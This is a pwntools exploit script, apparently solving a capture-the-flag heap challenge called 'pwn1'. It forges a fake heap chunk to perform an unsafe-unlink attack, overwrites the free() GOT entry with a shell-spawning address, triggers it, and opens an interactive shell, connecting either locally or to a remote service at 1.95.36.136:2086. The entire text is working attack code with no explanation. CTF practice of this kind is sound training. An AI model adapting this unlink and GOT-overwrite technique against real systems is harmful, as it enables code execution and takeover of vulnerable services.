from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn1"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)
libc = elf.libc

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("1.95.36.136", 2086)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

def add(s):
    io.sendlineafter("choice:", "1")
    io.sendlineafter("size:", str(s))

def delete(idx):
    io.sendlineafter("choice:", "2")
    io.sendlineafter("index:", str(idx))

def edit(idx, length, content):
    io.sendlineafter("choice:", "3")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("length:", str(length))
    io.sendlineafter("content:", content)

shell = 0x4009D5
p_chunk = 0x06010C0
payload = b""

add(0x80)
add(0x80)
add(0x80)
fd = p_chunk - 0x18
bk = p_chunk - 0x10

payload += p64(0) + p64(0x81)
payload += p64(fd) + p64(bk)
payload += b"t" * 0x60
payload += p64(0x80)
payload += p64(0x90)

edit(0, 0x88+1, payload) 
delete(1)

free_got = elf.got.get("free")
edit(0, 0x8*4, p64(0)*3+p64(free_got))

ddebug()
edit(0, 0x8, p64(shell))
delete(2)

io.interactive()
